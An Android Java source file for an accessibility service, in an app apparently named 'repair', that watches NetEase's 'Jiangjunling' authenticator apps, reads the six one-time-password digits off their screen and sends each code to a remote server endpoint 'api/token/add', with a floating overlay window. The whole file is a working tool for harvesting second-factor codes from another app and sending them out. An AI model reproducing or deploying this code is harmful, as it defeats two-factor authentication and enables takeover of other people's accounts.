package com.repair.repair.service;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.text.TextUtils;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.TextView;

import com.blankj.utilcode.util.ActivityUtils;
import com.repair.repair.App;
import com.repair.repair.R;
import com.repair.repair.base.AweSomeObserver;
import com.socks.library.KLog;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import me.goldze.mvvmhabit.utils.RxUtils;
import rxhttp.RxHttp;


public class MyAccessibilityService extends BaseAccessibilityService {

    public static final String ACTION_ADD_WINDOWS = "com.toshiba.packagenamedetector.ACTION_ADD_WINDOWS";
    public static final String ACTION_EXIT_APP = "com.toshiba.packagenamedetector.ACTION_EXIT_APP";
    public static final String ACTION_REMOVE_WINDOWS = "com.toshiba.packagenamedetector.ACTION_REMOVE_WINDOWS";
    public static final String ACTION_TRANSPARENT = "com.toshiba.packagenamedetector.ACTION_TRANSPARENT";
    private ArrayAdapter<String> adapter;
    private SharedPreferences appSetting;

    //    com.netease.mkey,com.netease.gl
    String oldpkg = "com.netease.mkey";
    String newpkg = "com.netease.gl";

    String last = "";

    List<String> packages = Arrays.asList("com.netease.mkey", "com.netease.gl");
    List<String> classs = Arrays.asList("com.netease.mkey.activity.NtSecActivity", "com.netease.gl.ui.activity.MkeyActivity");

    private BroadcastReceiver controlReceiver = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            switch (action) {
                case ACTION_TRANSPARENT:
                    int intExtra = intent.getIntExtra("alpha", 130);
                    if (rootView != null) {
                        rootView.setBackgroundColor(Color.argb(intExtra, 45, 49, 63));
                        llTitle.setBackgroundColor(Color.argb(intExtra, 255, 255, 255));
                        return;
                    }
                    return;
                case ACTION_ADD_WINDOWS:
                    isClose = false;
                    if (mWindowManager == null) {
                        createFloatView();
                        return;
                    }
                    return;
                case ACTION_EXIT_APP:
                    stopForeground(true);
                    return;

                case ACTION_REMOVE_WINDOWS:
                    mWindowManager.removeView(rootView);
                    mWindowManager = null;
                    return;
                default:
                    return;
            }
        }
    };

    private boolean isClose;
    private CharSequence lastPkg;
    private List<String> listString = new ArrayList();
    private View llTitle;
    private ListView lvList;
    WindowManager mWindowManager;
    private CharSequence packageName;
    private LinearLayout rootView;
    private TextView tvTitle;
    WindowManager.LayoutParams wmParams;

    private void addMsg(String str) {
        if (this.adapter == null) {
            return;
        }
        if (str == null || !str.equals(last)) {
            this.listString.add(0, str);
            this.adapter.notifyDataSetChanged();
            this.lvList.smoothScrollToPosition(0);
        }
    }

    private void createFloatView() {
        this.wmParams = new WindowManager.LayoutParams();
        this.mWindowManager = (WindowManager) getApplication().getSystemService(WINDOW_SERVICE);
        this.wmParams.type = 2002;
        this.wmParams.format = 1;
        this.wmParams.flags = 40;
        this.wmParams.gravity = 51;
        this.wmParams.x = 0;
        this.wmParams.y = 0;
        this.wmParams.width = getResources().getDisplayMetrics().widthPixels;
        this.wmParams.height = getResources().getDisplayMetrics().heightPixels / 5;
        this.rootView = (LinearLayout) LayoutInflater.from(getApplication()).inflate(R.layout.window_layout, (ViewGroup) null);
        this.mWindowManager.addView(this.rootView, this.wmParams);
        this.llTitle = this.rootView.findViewById(R.id.llTitle);
        int i = this.appSetting.getInt("alpha", 130);
        this.rootView.setBackgroundColor(Color.argb(i, 45, 49, 63));
        this.llTitle.setBackgroundColor(Color.argb(i, 255, 255, 255));
        this.lvList = (ListView) this.rootView.findViewById(R.id.lvList);
        this.tvTitle = (TextView) this.rootView.findViewById(R.id.tvTitle);
        final ImageView imageView = (ImageView) this.rootView.findViewById(R.id.ivMinimize);
        final ImageView imageView2 = (ImageView) this.rootView.findViewById(R.id.ivClose);
        final ImageView imageView3 = (ImageView) this.rootView.findViewById(R.id.ivMaximize);
        this.lvList.setFocusable(true);
        this.lvList.setFocusableInTouchMode(true);
        this.adapter = new ArrayAdapter<>(this, (int) R.layout.item, this.listString);
        this.lvList.setAdapter((ListAdapter) this.adapter);
        this.lvList.setOnItemClickListener((AdapterView.OnItemClickListener) (adapterView, view, i12, j) -> {
            try {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                clipboard.setText((CharSequence) listString.get(i12));
                tvTitle.setText("复制成功!");
                tvTitle.setTextColor(getResources().getColor(R.color.colorAccent));
                tvTitle.postDelayed(() -> {
                    String str = "";
                    if (!TextUtils.isEmpty(packageName)) {
                        try {
                            PackageManager packageManager = getPackageManager();
                            str = packageManager.getApplicationInfo(packageName.toString(), 128).loadLabel(packageManager).toString();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    tvTitle.setText(getString(R.string.app_name) + "  " + str);
                    tvTitle.setTextColor(-14540254);
                }, 1000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
        imageView3.setOnClickListener(view -> {
            int i1 = 5;
            int i2 = 1;
            if (tvTitle.getVisibility() == 8) {
                i2 = 5;
            }
            if (getResources().getDisplayMetrics().heightPixels != wmParams.height) {
                i1 = i2;
            }
            wmParams.width = getResources().getDisplayMetrics().widthPixels;
            wmParams.height = getResources().getDisplayMetrics().heightPixels / i1;
            mWindowManager.updateViewLayout(rootView, wmParams);
            lvList.setVisibility(View.VISIBLE);
            tvTitle.setVisibility(View.VISIBLE);
            imageView.setVisibility(View.VISIBLE);
            imageView2.setVisibility(View.VISIBLE);
            imageView3.setVisibility(View.VISIBLE);
        });
        imageView.setOnClickListener(view -> {
            wmParams.width = imageView.getWidth();
            wmParams.height = imageView.getHeight();
            mWindowManager.updateViewLayout(rootView, wmParams);
            lvList.setVisibility(View.GONE);
            tvTitle.setVisibility(View.GONE);
            imageView.setVisibility(View.GONE);
            imageView2.setVisibility(View.GONE);
            imageView3.setVisibility(View.VISIBLE);
        });
        imageView2.setOnClickListener(view -> {
            if (rootView != null) {
                mWindowManager.removeView(rootView);
                mWindowManager = null;
                isClose = true;
            }
        });
        this.tvTitle.setOnClickListener(view -> {
//                startActivity(new Intent(this, o00o.class).addFlags(268435456));
            ActivityUtils.startLauncherActivity();
        });
    }

    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        super.onAccessibilityEvent(accessibilityEvent);

        CharSequence packageName1 = accessibilityEvent.getPackageName();
        CharSequence className = accessibilityEvent.getClassName();
        if (packageName1 == null || className == null) {
            return;
        }


        if (!this.isClose) {
            this.packageName = accessibilityEvent.getPackageName();
            if (this.mWindowManager == null) {
                createFloatView();
            }

//            if (accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 4194304) {
//                if (className != null) {
//                    if (this.mWindowManager == null) {
//                        createFloatView();
//                    }
////                    if (this.rootView != null) {
////                        addMsg(className.toString());
////                    }
//                }
//                this.lastPkg = className;
//            }
//            String str = "";
//            if (!TextUtils.isEmpty(this.packageName)) {
//                try {
//                    PackageManager packageManager = getPackageManager();
//                    str = packageManager.getApplicationInfo(this.packageName.toString(), 128).loadLabel(packageManager).toString();
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
//            }
//            if (this.tvTitle != null) {
//                this.tvTitle.setText(getString(R.string.app_name) + "  "  );
//                this.tvTitle.setTextColor(-14540254);
//            }
        }


        String packageName = packageName1.toString();
        if (!packages.contains(packageName)) {
            KLog.d("错误，不在将军令App");
            setTvTitle("错误，不在将军令App内");
            return;
        }

//        String classname2 = className.toString();
//        if (!classs.contains(classname2)) {
//            KLog.d("错误，不在将军令界面");
//            return;
//        }

        if (oldpkg.equals(packageName)) {
            oldJJL();
        } else if (newpkg.equals(packageName)) {
            newJJl();
        }

    }

    public void setTvTitle(String str) {
        if (this.tvTitle != null) {
            this.tvTitle.setText(getString(R.string.app_name) + "  " + str);
            this.tvTitle.setTextColor(-14540254);
        }
    }

    private void newJJl() {
        KLog.e("在大神将军令界面");
        getToken(newpkg);
    }

    private void oldJJL() {
        KLog.e("在将军令界面");

        getToken(oldpkg);
    }

    private void getToken(String pkg) {
        KLog.e("在将军令界面");

        String id0 = pkg + ":id/otp_digit_0";
        String id1 = pkg + ":id/otp_digit_1";
        String id2 = pkg + ":id/otp_digit_2";
        String id3 = pkg + ":id/otp_digit_3";
        String id4 = pkg + ":id/otp_digit_4";
        String id5 = pkg + ":id/otp_digit_5";

        String d0 = findTextByID(id0);
        String d1 = findTextByID(id1);
        String d2 = findTextByID(id2);
        String d3 = findTextByID(id3);
        String d4 = findTextByID(id4);
        String d5 = findTextByID(id5);
        String dig = d0 + d1 + d2 + d3 + d4 + d5;

        if (dig.length() == 6) {
            KLog.e("找到令牌：" + dig);
            send(dig);

        } else {
            KLog.e("没找全令牌：" + dig);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(this.controlReceiver);
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (this.rootView != null) {
            this.mWindowManager.removeView(this.rootView);
            this.mWindowManager = null;
        }
    }

    public void onInterrupt() {
        super.onInterrupt();
        unregisterReceiver(this.controlReceiver);
    }

    @SuppressLint("WrongConstant")
    public void onServiceConnected() {
        super.onServiceConnected();
        init(this);

        this.appSetting = getSharedPreferences("app", 0);
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(ACTION_ADD_WINDOWS);
        intentFilter.addAction(ACTION_REMOVE_WINDOWS);
        intentFilter.addAction(ACTION_TRANSPARENT);
        intentFilter.addAction(ACTION_EXIT_APP);
        registerReceiver(controlReceiver, intentFilter);

//        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
//        accessibilityServiceInfo.notificationTimeout = 100;
//        accessibilityServiceInfo.eventTypes = -1;
//        accessibilityServiceInfo.feedbackType = -1;
//        setServiceInfo(accessibilityServiceInfo);
        startForeground(12346, new Notification.Builder(this)
                .setContentTitle(getString(R.string.app_name))
                .setContentText(String.format("触摸可打开%s面板", getString(R.string.app_name)))
                .setSmallIcon(R.mipmap.logo)
                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.mipmap.logo))
                .setContentIntent(PendingIntent.getBroadcast(getApplicationContext(),
                        (int) (System.currentTimeMillis() / 1000), new Intent(ACTION_ADD_WINDOWS), 134217728))
                .build());
    }

    @SuppressWarnings("all")
    public void send(String code) {
        if (last.equals(code)) {
            //已发送过
            return;
        }
        addMsg(code);

        RxHttp.get(App.appData.server + "api/token/add")
                .add("token", code)
                .connectTimeout(2000)  //连接超时3s
                .asString()
                .compose(RxUtils.schedulersTransformer()) //线程调度
                .subscribe(new AweSomeObserver<String>() {
                    @Override
                    public void _onNext(String s) {
                        KLog.w("发送完成 " + s);
                        last = code;
                    }
                });
    }
}
